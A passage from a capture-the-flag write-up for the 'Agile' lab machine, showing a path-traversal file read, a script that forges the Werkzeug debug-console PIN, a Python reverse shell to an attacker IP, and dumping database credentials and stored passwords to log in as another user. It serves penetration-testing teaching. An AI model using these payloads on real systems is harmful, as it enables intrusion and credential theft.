</span></span><span style="display:flex;"><span>Content-Type<span style="color:#f92672">:</span> <span style="color:#ae81ff">text/csv; charset=utf-8</span>
</span></span><span style="display:flex;"><span>Content-Length<span style="color:#f92672">:</span> <span style="color:#ae81ff">33</span>
</span></span><span style="display:flex;"><span>Connection<span style="color:#f92672">:</span> <span style="color:#ae81ff">keep-alive</span>
</span></span><span style="display:flex;"><span>Content-Disposition<span style="color:#f92672">:</span> <span style="color:#ae81ff">attachment; filename=superpass_export.csv</span>
</span></span><span style="display:flex;"><span>Vary<span style="color:#f92672">:</span> <span style="color:#ae81ff">Cookie</span>
</span></span><span style="display:flex;"><span>Set-Cookie<span style="color:#f92672">:</span> <span style="color:#ae81ff">session=.eJwlzjsOwjAMANC7ZGaIY9efXqZyYlsgMbViQtwdJN4J3rsddeZ1b3v588pbOx7R9pY2PAxBqrZkmYSiyGSmA0DAjWwMCfYBcyERiKRDpXYewVkYtJjUcPSwuQjUpzIAk9tg8DWn-CYp0B03zM5YzgGBJrpK2y_yuvL8b6x9vmvpLlM.Z9N2Pw.PClu4gGEjfXDm6HXatqgsdg9N3E; HttpOnly; Path=/</span>
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span><span style="color:#e6db74">ed5b159560f54721827644bc9b220d00</span>
</span></span></code></pre></div><p>We need to combine that ID with everything after the last <code>/</code> from <code>GET /download?fn=../../..</code>/proc/self/cgroup`</p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-http" data-lang="http"><span style="display:flex;"><span><span style="color:#66d9ef">HTTP</span><span style="color:#f92672">/</span><span style="color:#ae81ff">1.1</span> <span style="color:#ae81ff">200</span> <span style="color:#a6e22e">OK</span>
</span></span><span style="display:flex;"><span>Server<span style="color:#f92672">:</span> <span style="color:#ae81ff">nginx/1.18.0 (Ubuntu)</span>
</span></span><span style="display:flex;"><span>Date<span style="color:#f92672">:</span> <span style="color:#ae81ff">Fri, 14 Mar 2025 01:22:51 GMT</span>
</span></span><span style="display:flex;"><span>Content-Type<span style="color:#f92672">:</span> <span style="color:#ae81ff">text/csv; charset=utf-8</span>
</span></span><span style="display:flex;"><span>Content-Length<span style="color:#f92672">:</span> <span style="color:#ae81ff">35</span>
</span></span><span style="display:flex;"><span>Connection<span style="color:#f92672">:</span> <span style="color:#ae81ff">keep-alive</span>
</span></span><span style="display:flex;"><span>Content-Disposition<span style="color:#f92672">:</span> <span style="color:#ae81ff">attachment; filename=superpass_export.csv</span>
</span></span><span style="display:flex;"><span>Vary<span style="color:#f92672">:</span> <span style="color:#ae81ff">Cookie</span>
</span></span><span style="display:flex;"><span>Set-Cookie<span style="color:#f92672">:</span> <span style="color:#ae81ff">session=.eJwlzjsOwjAMANC7ZGaIY9efXqZyYlsgMbViQtwdJN4J3rsddeZ1b3v588pbOx7R9pY2PAxBqrZkmYSiyGSmA0DAjWwMCfYBcyERiKRDpXYewVkYtJjUcPSwuQjUpzIAk9tg8DWn-CYp0B03zM5YzgGBJrpK2y_yuvL8b6x9vmvpLlM.Z9OE6w.ocby5_PqocIFXHWlilNvrhmp_is; HttpOnly; Path=/</span>
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span><span style="color:#e6db74">0::/system.slice/superpass.service</span>
</span></span></code></pre></div><p>Now we can take the script from <a href="https://book.hacktricks.wiki/en/network-services-pentesting/pentesting-web/werkzeug.html#werkzeug-console-pin-exploit">here</a> and modify it with the data we&rsquo;ve collected. Note: we can find the <code>modname</code> in the error message we saw earlier
<img src="/images/Agile/wsgi.png" alt="Wsgi"></p>
<p>Then the final Python script looks like</p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-python" data-lang="python"><span style="display:flex;"><span><span style="color:#f92672">import</span> hashlib
</span></span><span style="display:flex;"><span><span style="color:#f92672">from</span> itertools <span style="color:#f92672">import</span> chain
</span></span><span style="display:flex;"><span>probably_public_bits <span style="color:#f92672">=</span> [
</span></span><span style="display:flex;"><span>    <span style="color:#e6db74">&#39;www-data&#39;</span>,  <span style="color:#75715e"># username</span>
</span></span><span style="display:flex;"><span>    <span style="color:#e6db74">&#39;flask.app&#39;</span>,  <span style="color:#75715e"># modname</span>
</span></span><span style="display:flex;"><span>    <span style="color:#e6db74">&#39;wsgi_app&#39;</span>,  <span style="color:#75715e"># getattr(app, &#39;__name__&#39;, getattr(app.__class__, &#39;__name__&#39;))</span>
</span></span><span style="display:flex;"><span>    <span style="color:#e6db74">&#39;/app/venv/lib/python3.10/site-packages/flask/app.py&#39;</span>  <span style="color:#75715e"># getattr(mod, &#39;__file__&#39;, None),</span>
</span></span><span style="display:flex;"><span>]
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>private_bits <span style="color:#f92672">=</span> [
</span></span><span style="display:flex;"><span>    <span style="color:#e6db74">&#39;345051823738&#39;</span>,  <span style="color:#75715e"># str(uuid.getnode()),  /sys/class/net/ens33/address</span>
</span></span><span style="display:flex;"><span>    <span style="color:#e6db74">&#39;ed5b159560f54721827644bc9b220d00superpass.service&#39;</span>  <span style="color:#75715e"># get_machine_id(), /etc/machine-id</span>
</span></span><span style="display:flex;"><span>]
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span><span style="color:#75715e"># h = hashlib.md5()  # Changed in https://werkzeug.palletsprojects.com/en/2.2.x/changes/#version-2-0-0</span>
</span></span><span style="display:flex;"><span>h <span style="color:#f92672">=</span> hashlib<span style="color:#f92672">.</span>sha1()
</span></span><span style="display:flex;"><span><span style="color:#66d9ef">for</span> bit <span style="color:#f92672">in</span> chain(probably_public_bits, private_bits):
</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">if</span> <span style="color:#f92672">not</span> bit:
</span></span><span style="display:flex;"><span>        <span style="color:#66d9ef">continue</span>
</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">if</span> isinstance(bit, str):
</span></span><span style="display:flex;"><span>        bit <span style="color:#f92672">=</span> bit<span style="color:#f92672">.</span>encode(<span style="color:#e6db74">&#39;utf-8&#39;</span>)
</span></span><span style="display:flex;"><span>    h<span style="color:#f92672">.</span>update(bit)
</span></span><span style="display:flex;"><span>h<span style="color:#f92672">.</span>update(<span style="color:#e6db74">b</span><span style="color:#e6db74">&#39;cookiesalt&#39;</span>)
</span></span><span style="display:flex;"><span><span style="color:#75715e"># h.update(b&#39;shittysalt&#39;)</span>
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>cookie_name <span style="color:#f92672">=</span> <span style="color:#e6db74">&#39;__wzd&#39;</span> <span style="color:#f92672">+</span> h<span style="color:#f92672">.</span>hexdigest()[:<span style="color:#ae81ff">20</span>]
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>num <span style="color:#f92672">=</span> <span style="color:#66d9ef">None</span>
</span></span><span style="display:flex;"><span><span style="color:#66d9ef">if</span> num <span style="color:#f92672">is</span> <span style="color:#66d9ef">None</span>:
</span></span><span style="display:flex;"><span>    h<span style="color:#f92672">.</span>update(<span style="color:#e6db74">b</span><span style="color:#e6db74">&#39;pinsalt&#39;</span>)
</span></span><span style="display:flex;"><span>    num <span style="color:#f92672">=</span> (<span style="color:#e6db74">&#39;</span><span style="color:#e6db74">%09d</span><span style="color:#e6db74">&#39;</span> <span style="color:#f92672">%</span> int(h<span style="color:#f92672">.</span>hexdigest(), <span style="color:#ae81ff">16</span>))[:<span style="color:#ae81ff">9</span>]
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>rv <span style="color:#f92672">=</span> <span style="color:#66d9ef">None</span>
</span></span><span style="display:flex;"><span><span style="color:#66d9ef">if</span> rv <span style="color:#f92672">is</span> <span style="color:#66d9ef">None</span>:
</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">for</span> group_size <span style="color:#f92672">in</span> <span style="color:#ae81ff">5</span>, <span style="color:#ae81ff">4</span>, <span style="color:#ae81ff">3</span>:
</span></span><span style="display:flex;"><span>        <span style="color:#66d9ef">if</span> len(num) <span style="color:#f92672">%</span> group_size <span style="color:#f92672">==</span> <span style="color:#ae81ff">0</span>:
</span></span><span style="display:flex;"><span>            rv <span style="color:#f92672">=</span> <span style="color:#e6db74">&#39;-&#39;</span><span style="color:#f92672">.</span>join(num[x:x <span style="color:#f92672">+</span> group_size]<span style="color:#f92672">.</span>rjust(group_size, <span style="color:#e6db74">&#39;0&#39;</span>)
</span></span><span style="display:flex;"><span>                          <span style="color:#66d9ef">for</span> x <span style="color:#f92672">in</span> range(<span style="color:#ae81ff">0</span>, len(num), group_size))
</span></span><span style="display:flex;"><span>            <span style="color:#66d9ef">break</span>
</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">else</span>:
</span></span><span style="display:flex;"><span>        rv <span style="color:#f92672">=</span> num
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>print(rv)
</span></span></code></pre></div><p>Then we <code>chmod +x</code> the script and run it to get a pin</p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-console" data-lang="console"><span style="display:flex;"><span>$python3 werkzeug.py
</span></span><span style="display:flex;"><span>824-163-913
</span></span></code></pre></div><p>Now we need to generate another error</p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-http" data-lang="http"><span style="display:flex;"><span><span style="color:#960050;background-color:#1e0010">http://superpass.htb/download?fn=12312321321
</span></span></span></code></pre></div><p>Then we will see the error page and there will be a little console button next to the lines of code
<img src="/images/Agile/console.png" alt="Console"></p>
<p>After we enter the pin, we now have a console!
<img src="/images/Agile/success.png" alt="Successful"></p>
<p>Then we can use this <code>python</code> console to get a reverse shell</p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-python" data-lang="python"><span style="display:flex;"><span><span style="color:#f92672">import</span> socket<span style="color:#f92672">,</span>subprocess<span style="color:#f92672">,</span>os; s<span style="color:#f92672">=</span>socket<span style="color:#f92672">.</span>socket(); s<span style="color:#f92672">.</span>connect((<span style="color:#e6db74">&#34;10.10.14.51&#34;</span>,<span style="color:#ae81ff">8443</span>)); os<span style="color:#f92672">.</span>dup2(s<span style="color:#f92672">.</span>fileno(),<span style="color:#ae81ff">0</span>); os<span style="color:#f92672">.</span>dup2(s<span style="color:#f92672">.</span>fileno(),<span style="color:#ae81ff">1</span>); os<span style="color:#f92672">.</span>dup2(s<span style="color:#f92672">.</span>fileno(),<span style="color:#ae81ff">2</span>); subprocess<span style="color:#f92672">.</span>call([<span style="color:#e6db74">&#34;/bin/bash&#34;</span>])
</span></span></code></pre></div><div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-console" data-lang="console"><span style="display:flex;"><span>$nc -nlvp <span style="color:#ae81ff">8443</span>
</span></span><span style="display:flex;"><span>listening on [any] 8443 ...
</span></span><span style="display:flex;"><span>connect to [10.10.14.51] from (UNKNOWN) [10.10.11.203] 45236
</span></span><span style="display:flex;"><span>whoami
</span></span><span style="display:flex;"><span>www-data
</span></span></code></pre></div><p>Then we can upgrade our shell with</p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-console" data-lang="console"><span style="display:flex;"><span>python3 -c &#39;import pty; pty.spawn(&#34;/bin/bash&#34;)&#39;
</span></span><span style="display:flex;"><span>(venv) www-data@agile:/app/app$
</span></span></code></pre></div><p>Going into <code>sites-enabled</code> we see some more subdomains</p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-console" data-lang="console"><span style="display:flex;"><span>www-data@agile:/etc/nginx/sites-enabled$ ls
</span></span><span style="display:flex;"><span>ls
</span></span><span style="display:flex;"><span>agile.htb.nginx  redirect.nginx  superpass-test.nginx  superpass.nginx
</span></span></code></pre></div><p>We add <code>agile.htb</code> to our <code>/etc/hosts</code> and navigate to it and it looks like it&rsquo;s a default <code>nginx</code> page
<img src="/images/Agile/agile.png" alt="Agile.htb"></p>
<p>If we remember from the error page earlier, we saw the path of where the website files are. Let&rsquo;s navigate to that directory. Again catting out <code>app.py</code> we are looking for anything related to the database</p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-python" data-lang="python"><span style="display:flex;"><span><span style="color:#f92672">import</span> json
</span></span><span style="display:flex;"><span><span style="color:#f92672">import</span> os
</span></span><span style="display:flex;"><span><span style="color:#f92672">import</span> sys
</span></span><span style="display:flex;"><span><span style="color:#f92672">import</span> flask
</span></span><span style="display:flex;"><span><span style="color:#f92672">import</span> jinja_partials
</span></span><span style="display:flex;"><span><span style="color:#f92672">from</span> flask_login <span style="color:#f92672">import</span> LoginManager
</span></span><span style="display:flex;"><span>sys<span style="color:#f92672">.</span>path<span style="color:#f92672">.</span>insert(<span style="color:#ae81ff">0</span>, os<span style="color:#f92672">.</span>path<span style="color:#f92672">.</span>abspath(os<span style="color:#f92672">.</span>path<span style="color:#f92672">.</span>join(os<span style="color:#f92672">.</span>path<span style="color:#f92672">.</span>dirname(__file__), <span style="color:#e6db74">&#39;..&#39;</span>)))
</span></span><span style="display:flex;"><span><span style="color:#f92672">from</span> superpass.infrastructure.view_modifiers <span style="color:#f92672">import</span> response
</span></span><span style="display:flex;"><span><span style="color:#f92672">from</span> superpass.data <span style="color:#f92672">import</span> db_session
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>app <span style="color:#f92672">=</span> flask<span style="color:#f92672">.</span>Flask(__name__)
</span></span><span style="display:flex;"><span>app<span style="color:#f92672">.</span>config[<span style="color:#e6db74">&#39;SECRET_KEY&#39;</span>] <span style="color:#f92672">=</span> os<span style="color:#f92672">.</span>urandom(<span style="color:#ae81ff">32</span>)
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span><span style="color:#66d9ef">def</span> <span style="color:#a6e22e">register_blueprints</span>():
</span></span><span style="display:flex;"><span>    <span style="color:#f92672">from</span> superpass.views <span style="color:#f92672">import</span> home_views
</span></span><span style="display:flex;"><span>    <span style="color:#f92672">from</span> superpass.views <span style="color:#f92672">import</span> vault_views
</span></span><span style="display:flex;"><span>    <span style="color:#f92672">from</span> superpass.views <span style="color:#f92672">import</span> account_views
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>    app<span style="color:#f92672">.</span>register_blueprint(home_views<span style="color:#f92672">.</span>blueprint)
</span></span><span style="display:flex;"><span>    app<span style="color:#f92672">.</span>register_blueprint(vault_views<span style="color:#f92672">.</span>blueprint)
</span></span><span style="display:flex;"><span>    app<span style="color:#f92672">.</span>register_blueprint(account_views<span style="color:#f92672">.</span>blueprint)
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span><span style="color:#66d9ef">def</span> <span style="color:#a6e22e">setup_db</span>():
</span></span><span style="display:flex;"><span>    db_session<span style="color:#f92672">.</span>global_init(app<span style="color:#f92672">.</span>config[<span style="color:#e6db74">&#39;SQL_URI&#39;</span>])
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span><span style="color:#66d9ef">def</span> <span style="color:#a6e22e">configure_login_manager</span>():
</span></span><span style="display:flex;"><span>    login_manager <span style="color:#f92672">=</span> LoginManager()
</span></span><span style="display:flex;"><span>    login_manager<span style="color:#f92672">.</span>login_view <span style="color:#f92672">=</span> <span style="color:#e6db74">&#39;account.login_get&#39;</span>
</span></span><span style="display:flex;"><span>    login_manager<span style="color:#f92672">.</span>init_app(app)
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>    <span style="color:#f92672">from</span> superpass.data.user <span style="color:#f92672">import</span> User
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>    <span style="color:#a6e22e">@login_manager.user_loader</span>
</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">def</span> <span style="color:#a6e22e">load_user</span>(user_id):
</span></span><span style="display:flex;"><span>        <span style="color:#f92672">from</span> superpass.services.user_service <span style="color:#f92672">import</span> get_user_by_id
</span></span><span style="display:flex;"><span>        <span style="color:#66d9ef">return</span> get_user_by_id(user_id)
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span><span style="color:#66d9ef">def</span> <span style="color:#a6e22e">configure_template_options</span>():
</span></span><span style="display:flex;"><span>    jinja_partials<span style="color:#f92672">.</span>register_extensions(app)
</span></span><span style="display:flex;"><span>    helpers <span style="color:#f92672">=</span> {
</span></span><span style="display:flex;"><span>        <span style="color:#e6db74">&#39;len&#39;</span>: len,
</span></span><span style="display:flex;"><span>        <span style="color:#e6db74">&#39;str&#39;</span>: str,
</span></span><span style="display:flex;"><span>        <span style="color:#e6db74">&#39;type&#39;</span>: type,
</span></span><span style="display:flex;"><span>    }
</span></span><span style="display:flex;"><span>    app<span style="color:#f92672">.</span>jinja_env<span style="color:#f92672">.</span>globals<span style="color:#f92672">.</span>update(<span style="color:#f92672">**</span>helpers)
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span><span style="color:#66d9ef">def</span> <span style="color:#a6e22e">load_config</span>():
</span></span><span style="display:flex;"><span>    config_path <span style="color:#f92672">=</span> os<span style="color:#f92672">.</span>getenv(<span style="color:#e6db74">&#34;CONFIG_PATH&#34;</span>)
</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">with</span> open(config_path, <span style="color:#e6db74">&#39;r&#39;</span>) <span style="color:#66d9ef">as</span> f:
</span></span><span style="display:flex;"><span>        <span style="color:#66d9ef">for</span> k, v <span style="color:#f92672">in</span> json<span style="color:#f92672">.</span>load(f)<span style="color:#f92672">.</span>items():
</span></span><span style="display:flex;"><span>            app<span style="color:#f92672">.</span>config[k] <span style="color:#f92672">=</span> v
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span><span style="color:#66d9ef">def</span> <span style="color:#a6e22e">configure</span>():
</span></span><span style="display:flex;"><span>    load_config()
</span></span><span style="display:flex;"><span>    register_blueprints()
</span></span><span style="display:flex;"><span>    configure_login_manager()
</span></span><span style="display:flex;"><span>    setup_db()
</span></span><span style="display:flex;"><span>    configure_template_options()
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span><span style="color:#66d9ef">def</span> <span style="color:#a6e22e">enable_debug</span>():
</span></span><span style="display:flex;"><span>    <span style="color:#f92672">from</span> werkzeug.debug <span style="color:#f92672">import</span> DebuggedApplication
</span></span><span style="display:flex;"><span>    app<span style="color:#f92672">.</span>wsgi_app <span style="color:#f92672">=</span> DebuggedApplication(app<span style="color:#f92672">.</span>wsgi_app, <span style="color:#66d9ef">True</span>)
</span></span><span style="display:flex;"><span>    app<span style="color:#f92672">.</span>debug <span style="color:#f92672">=</span> <span style="color:#66d9ef">True</span>
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span><span style="color:#66d9ef">def</span> <span style="color:#a6e22e">main</span>():
</span></span><span style="display:flex;"><span>    enable_debug()
</span></span><span style="display:flex;"><span>    configure()
</span></span><span style="display:flex;"><span>    app<span style="color:#f92672">.</span>run(debug<span style="color:#f92672">=</span><span style="color:#66d9ef">True</span>)
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span><span style="color:#66d9ef">def</span> <span style="color:#a6e22e">dev</span>():
</span></span><span style="display:flex;"><span>    configure()
</span></span><span style="display:flex;"><span>    app<span style="color:#f92672">.</span>run(port<span style="color:#f92672">=</span><span style="color:#ae81ff">5555</span>)
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span><span style="color:#66d9ef">if</span> __name__ <span style="color:#f92672">==</span> <span style="color:#e6db74">&#39;__main__&#39;</span>:
</span></span><span style="display:flex;"><span>    main()
</span></span><span style="display:flex;"><span><span style="color:#66d9ef">else</span>:
</span></span><span style="display:flex;"><span>    configure()
</span></span></code></pre></div><p>We see <code>setup_db()</code> and above it <code>load_config()</code>. We also see <code>load_config()</code> contains the <code>config_path</code> which points to <code>os.getenv(&quot;CONFIG_PATH&quot;)</code>. This means it&rsquo;s an environment variable pointing to a JSON file that holds the configuration data. We can get the value</p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-console" data-lang="console"><span style="display:flex;"><span>$ echo $CONFIG_PATH
</span></span><span style="display:flex;"><span>/app/config_prod.json
</span></span></code></pre></div><p>Then <code>cat</code> it</p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-console" data-lang="console"><span style="display:flex;"><span>$ cat /app/config_prod.json
</span></span><span style="display:flex;"><span>{&#34;SQL_URI&#34;: &#34;mysql+pymysql://superpassuser:dSA6l7q*yIVs$39Ml6ywvgK@localhost/superpass&#34;}
</span></span></code></pre></div><p>Nice. We have the database credentials. Now we can log into the database</p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-console" data-lang="console"><span style="display:flex;"><span>$ mysql -u superpassuser -p
</span></span><span style="display:flex;"><span>Enter password: dSA6l7q*yIVs$39Ml6ywvgK
</span></span></code></pre></div><p>Let&rsquo;s check out the databases</p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-console" data-lang="console"><span style="display:flex;"><span>mysql&gt; show databases;
</span></span><span style="display:flex;"><span>show databases;
</span></span><span style="display:flex;"><span>+--------------------+
</span></span><span style="display:flex;"><span>| Database           |
</span></span><span style="display:flex;"><span>+--------------------+
</span></span><span style="display:flex;"><span>| information_schema |
</span></span><span style="display:flex;"><span>| performance_schema |
</span></span><span style="display:flex;"><span>| superpass          |
</span></span><span style="display:flex;"><span>+--------------------+
</span></span><span style="display:flex;"><span>3 rows in set (0.00 sec)
</span></span></code></pre></div><p>The two tables inside are users and passwords</p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-console" data-lang="console"><span style="display:flex;"><span>mysql&gt; show tables;
</span></span><span style="display:flex;"><span>show tables;
</span></span><span style="display:flex;"><span>+---------------------+
</span></span><span style="display:flex;"><span>| Tables_in_superpass |
</span></span><span style="display:flex;"><span>+---------------------+
</span></span><span style="display:flex;"><span>| passwords           |
</span></span><span style="display:flex;"><span>| users               |
</span></span><span style="display:flex;"><span>+---------------------+
</span></span><span style="display:flex;"><span>2 rows in set (0.00 sec)
</span></span></code></pre></div><p>If we print them out we get</p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-console" data-lang="console"><span style="display:flex;"><span>mysql&gt; select * from users;
</span></span><span style="display:flex;"><span>select * from users;
</span></span><span style="display:flex;"><span>+----+----------+--------------------------------------------------------------------------------------------------------------------------+
</span></span><span style="display:flex;"><span>| id | username | hashed_password                                                                                                          |
</span></span><span style="display:flex;"><span>+----+----------+--------------------------------------------------------------------------------------------------------------------------+
</span></span><span style="display:flex;"><span>|  1 | 0xdf     | $6$rounds=200000$FRtvqJFfrU7DSyT7$8eGzz8Yk7vTVKudEiFBCL1T7O4bXl0.yJlzN0jp.q0choSIBfMqvxVIjdjzStZUYg6mSRB2Vep0qELyyr0fqF. |
</span></span><span style="display:flex;"><span>|  2 | corum    | $6$rounds=200000$yRvGjY1MIzQelmMX$9273p66QtJQb9afrbAzugxVFaBhb9lyhp62cirpxJEOfmIlCy/LILzFxsyWj/mZwubzWylr3iaQ13e4zmfFfB1 |
</span></span><span style="display:flex;"><span>|  9 | hacker   | $6$rounds=200000$WE5UUmerT8qrj6iv$HoR2qkuMBiQ3zIDvv1JF2VqYB.S4DUoQgFFn0KK/W6RAGmatsMCusrHfExEw5OC9gQx9hsnSvEvhre4wjxizP0 |
</span></span><span style="display:flex;"><span>+----+----------+--------------------------------------------------------------------------------------------------------------------------+
</span></span><span style="display:flex;"><span>3 rows in set (0.00 sec)
</span></span><span style="display:flex;"><span><span style="color:#960050;background-color:#1e0010">
</span></span></span><span style="display:flex;"><span><span style="color:#960050;background-color:#1e0010"></span>mysql&gt; select * from passwords;
</span></span><span style="display:flex;"><span>select * from passwords;
</span></span><span style="display:flex;"><span>+----+---------------------+---------------------+----------------+----------+----------------------+---------+
</span></span><span style="display:flex;"><span>| id | created_date        | last_updated_data   | url            | username | password             | user_id |
</span></span><span style="display:flex;"><span>+----+---------------------+---------------------+----------------+----------+----------------------+---------+
</span></span><span style="display:flex;"><span>|  3 | 2022-12-02 21:21:32 | 2022-12-02 21:21:32 | hackthebox.com | 0xdf     | 762b430d32eea2f12970 |       1 |
</span></span><span style="display:flex;"><span>|  4 | 2022-12-02 21:22:55 | 2022-12-02 21:22:55 | mgoblog.com    | 0xdf     | 5b133f7a6a1c180646cb |       1 |
</span></span><span style="display:flex;"><span>|  6 | 2022-12-02 21:24:44 | 2022-12-02 21:24:44 | mgoblog        | corum    | 47ed1e73c955de230a1d |       2 |
</span></span><span style="display:flex;"><span>|  7 | 2022-12-02 21:25:15 | 2022-12-02 21:25:15 | ticketmaster   | corum    | 9799588839ed0f98c211 |       2 |
</span></span><span style="display:flex;"><span>|  8 | 2022-12-02 21:25:27 | 2022-12-02 21:25:27 | agile          | corum    | 5db7caa1d13cc37c9fc2 |       2 |
</span></span><span style="display:flex;"><span>+----+---------------------+---------------------+----------------+----------+----------------------+---------+
</span></span><span style="display:flex;"><span>5 rows in set (0.00 sec)
</span></span></code></pre></div><p>I&rsquo;m guessing that the password for &ldquo;agile&rdquo; for the <code>corum</code> user is their password on this box since this host&rsquo;s name is agile. Let&rsquo;s try to <code>su</code> into <code>corum</code></p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-console" data-lang="console"><span style="display:flex;"><span>www-data@agile:/app/app/superpass/data$ su corum
</span></span><span style="display:flex;"><span>su corum
</span></span><span style="display:flex;"><span>Password: 5db7caa1d13cc37c9fc2
</span></span><span style="display:flex;"><span><span style="color:#960050;background-color:#1e0010">
</span></span></span><span style="display:flex;"><span><span style="color:#960050;background-color:#1e0010"></span>corum@agile:/app/app/superpass/data$
</span></span></code></pre></div><p>We are in! Let&rsquo;s grab the user flag</p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-console" data-lang="console"><span style="display:flex;"><span>corum@agile:~$ cat user.txt
</span></span><span style="display:flex;"><span>cat user.txt
</span></span><span style="display:flex;"><span>ab31eaf98429fef88e49cee60d4c0c8d
</span></span></code></pre></div><p>We can also now SSH into the box as <code>corum</code> and use a much better shell!</p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-console" data-lang="console"><span style="display:flex;"><span>$ssh corum@10.10.11.203
</span></span><span style="display:flex;"><span>The authenticity of host &#39;10.10.11.203 (10.10.11.203)&#39; can&#39;t be established.
</span></span><span style="display:flex;"><span>ED25519 key fingerprint is SHA256:kxY+4fRgoCr8yE48B5Lb02EqxyyUN9uk6i/ZIH4H1pc.
</span></span><span style="display:flex;"><span>This key is not known by any other names.
</span></span><span style="display:flex;"><span>Are you sure you want to continue connecting (yes/no/[fingerprint])? yes
</span></span><span style="display:flex;"><span>Warning: Permanently added &#39;10.10.11.203&#39; (ED25519) to the list of known hosts.
</span></span><span style="display:flex;"><span>corum@10.10.11.203&#39;s password:
</span></span><span style="display:flex;"><span>Welcome to Ubuntu 22.04.2 LTS (GNU/Linux 5.15.0-60-generic x86_64)
</span></span><span style="display:flex;"><span><span style="color:#960050;background-color:#1e0010">
</span></span></span><span style="display:flex;"><span><span style="color:#960050;background-color:#1e0010"></span> * Documentation:  https://help.ubuntu.com
</span></span><span style="display:flex;"><span> * Management:     https://landscape.canonical.com
</span></span><span style="display:flex;"><span> * Support:        https://ubuntu.com/advantage
</span></span><span style="display:flex;"><span><span style="color:#960050;background-color:#1e0010">
</span></span></span><span style="display:flex;"><span><span style="color:#960050;background-color:#1e0010"></span>This system has been minimized by removing packages and content that are
</span></span><span style="display:flex;"><span>not required on a system that users do not log into.
</span></span><span style="display:flex;"><span><span style="color:#960050;background-color:#1e0010">
</span></span></span><span style="display:flex;"><span><span style="color:#960050;background-color:#1e0010"></span>To restore this content, you can run the &#39;unminimize&#39; command.
</span></span><span style="display:flex;"><span><span style="color:#960050;background-color:#1e0010">
</span></span></span><span style="display:flex;"><span><span style="color:#960050;background-color:#1e0010"></span>The programs included with the Debian GNU/Linux system are free software;
</span></span><span style="display:flex;"><span>the exact distribution terms for each program are described in the
